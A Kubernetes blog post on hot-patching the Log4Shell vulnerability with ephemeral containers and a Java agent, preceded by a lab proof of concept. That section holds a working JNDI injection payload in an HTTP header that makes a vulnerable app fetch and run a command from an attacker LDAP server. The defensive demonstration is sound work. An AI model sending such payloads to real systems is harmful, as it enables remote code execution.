---
layout: blog
title: "Patching Log4Shell in One Command Without Downtime Using Ephemeral Containers"
date: 2021-12-13
slug: patching-log4shell-using-ephemeral-containers
---

**Author:** Eden Federman

## A new critical vulnerability arises

[Log4Shell](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228) is a Remote Code Execution vulnerability in the Apache Log4j library, an extremely popular Java-based logging framework. This vulnerability allows an attacker who can control log messages to execute arbitrary code loaded from the attacker-controlled servers.
On December 9th this vulnerability was published as CVE-2021-44228, categorized as Critical with a CVSS score of 10 (the highest score possible).

Due to the massive adoption of the Log4j framework, this vulnerability also indirectly affects many Java open-source projects such as Apache Struts 2, Apache Solr, Apache Druid, and Spring Boot.
If your workload is affected, the best way to patch this vulnerability is by upgrading Log4j to version 2.15.0 or higher.

Upgrading the log4j version has a few disadvantages:

- Requires building a new container image
- Deploying the modified version will cause a restart to the running application and possibly some downtime.
- The affected log4j versions may also be downloaded via a transitive dependency of other libraries, which makes the upgrade process even more difficult.

Fortunately, you can leverage the ephemeral containers feature introduced in Kubernetes v1.16 via a feature gate. In the newly released Kubernetes v1.23, this feature is enabled by default.
Ephemeral containers will allow us to patch applications without modifying code or causing downtime.
The following mitigation is achieved by running an external tool named [Log4jHotPatch](https://github.com/corretto/hotpatch-for-apache-log4j2) as an ephemeral container.

## Proof of Concept

Before diving into the solution, first I want to give you a safe way to see the attack in action.
First, you will need a Kubernetes cluster running version v1.23. An easy way to start one is via kind:

```shell
kind create cluster --image=kindest/node:v1.23.0
```

Next, simulate the attack by deploying a [Spring Boot application](https://github.com/christophetd/log4shell-vulnerable-app) and a malicious JNDI server via the following command:

```shell
kubectl apply -f https://raw.githubusercontent.com/kubernetes/website/main/content/en/blog/_posts/2021-12-13-patching-log4shell-using-ephemeral-containers/log4j-vuln-example.yaml
```

Now you have two running pods: vulnerable-app and attacker.
In order to attack the vulnerable application, you need to interact with it in a way that triggers writing a log message with our malicious string. The example vulnerable application has a feature that will log the “X-Api-Version” header of any incoming HTTP request. In addition, the malicious JNDI server contains an API endpoint that will return a class that executes the command specified at `/Basic/Command/Base64/<base64-command>`.
Everything left to do is to invoke an HTTP request with the malicious command, in this example: `pkill java` (a denial of service attack).

```shell
kubectl run -it --rm client --image=curlimages/curl -- curl http://vulnerable-app:8080 -H 'X-Api-Version: ${jndi:ldap://attacker:1389/Basic/Command/Base64/cGtpbGwgamF2YQo=}'
```

{{< mermaid >}}
sequenceDiagram
Attacker ->> Java Application: HTTP Request with X-Api-Version header pointing to the attacker's server<br>'X-Api-Version: ${jndi:ldap://attacker:1389/Basic/Command/Base64/cGtpbGwgamF2YQo=}'
Java Application ->> Attacker JNDI Server:/Basic/Command/Base64/cGtpbGwgamF2YQo=
Attacker JNDI Server ->> Java Application: pkill java
{{</ mermaid >}}
Once the command executes, you should see that our Spring application crashed!

```shell
kubectl get pods
NAME             READY   STATUS    RESTARTS   AGE
attacker         1/1     Running   0          16m
vulnerable-app   0/1     Error     0          16m
```

## Mitigation

The mitigation is based on a new Kubernetes feature called ephemeral containers, a new kind of container that runs temporarily in an existing Pod.
In this mitigation solution, the ephemeral container will contain an image based on [Log4jHotPatch](https://github.com/corretto/hotpatch-for-apache-log4j2) - a Java agent that removes the problematic log4j code. Specifically, it changes the `lookup()` method of the `org.apache.logging.log4j.core.lookup.JndiLookup` class to always return the string `"Patched JndiLookup::lookup()"` without accessing external, possibly malicious, servers.

In order to inject a Java agent into a running Java application, both containers need to have a shared `/tmp` folder. This is achieved by creating a symbolic link in the ephemeral container entrypoint, referring to the target container `/tmp` directory (the full Dockerfile is available [here](https://github.com/edeNFed/log4shell-ephemeral-containers/blob/2da22799166d8e4fc5fed342f2d8b83f0b9f7257/patch-java8.Dockerfile)).

```dockerfile
CMD rm -rf /tmp \
    && ln -s /proc/1/root/tmp / \
    && java -cp .:${JAVA_HOME}/lib/tools.jar Log4jHotPatch
```

If you ran the proof of concept from earlier, redeploy the applications by running:

```shell
kubectl delete -f https://raw.githubusercontent.com/kubernetes/website/main/content/en/blog/_posts/2021-12-13-patching-log4shell-using-ephemeral-containers/log4j-vuln-example.yaml
kubectl apply -f https://raw.githubusercontent.com/kubernetes/website/main/content/en/blog/_posts/2021-12-13-patching-log4shell-using-ephemeral-containers/log4j-vuln-example.yaml
```

Finally, run the mitigation command:

```shell
kubectl debug -it vulnerable-app --image=edenfed/log4j2patch:8 --target=vulnerable-app
```

You can verify that the mitigation worked by executing the attack command again and observing that the Spring Boot application is still running.

```shell
kubectl get pods
NAME             READY   STATUS    RESTARTS   AGE
attacker         1/1     Running   0          70s
vulnerable-app   1/1     Running   0          70s
```

Notice that the current fix is temporarly, any restart to the application will require running the patching command again. This patch works well for a long running workloads that can not be restarted. A permanent fix should involve upgrading the log4j version.

## Summary

Log4Shell is an extremely critical attack, affecting most of the Java applications around the world.
Luckily, newer versions of Kubernetes include a great feature that allows us to patch this vulnerability easily without needing to modify the container image or restart the application.

## Credits

- [Apache Log4j](https://logging.apache.org/log4j/) by the Apache Software Foundation
- [Log4jHotPatch](https://github.com/corretto/hotpatch-for-apache-log4j2) created by AWS Corretto team
- [Log4Shell example Spring App](https://github.com/christophetd/log4shell-vulnerable-app) created by christophetd
- [Malicious JNDI Server (JNDIExploit)](https://github.com/feihong-cs) by feihong-cs
